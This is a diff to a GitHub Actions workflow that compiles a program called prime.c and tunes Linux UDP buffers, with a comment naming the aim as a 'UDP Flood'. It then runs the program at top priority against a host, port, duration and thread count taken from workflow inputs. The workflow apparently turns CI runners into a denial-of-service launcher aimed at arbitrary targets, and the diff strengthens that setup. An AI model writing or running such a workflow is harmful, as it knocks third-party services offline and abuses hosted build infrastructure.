@@ -21,13 +21,15 @@ jobs:
 
       - name: 🔥 FIRING GHOST v6.5
         run: |
+          # High Speed Optimization Flags
           gcc -Ofast -march=native prime.c -o PRIME -lpthread
           chmod +x PRIME
           
-          # Network Buffer Optimization
+          # Tuning Linux Network Stack for UDP Flood
           sudo sysctl -w net.core.rmem_max=4194304
           sudo sysctl -w net.core.wmem_max=4194304
+          sudo sysctl -w net.ipv4.udp_mem='65536 131072 262144'
           
-          # Priority Execution on both cores
+          # Max Priority Execution on both CPU cores
           sudo nice -n -20 taskset -c 0,1 ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
           
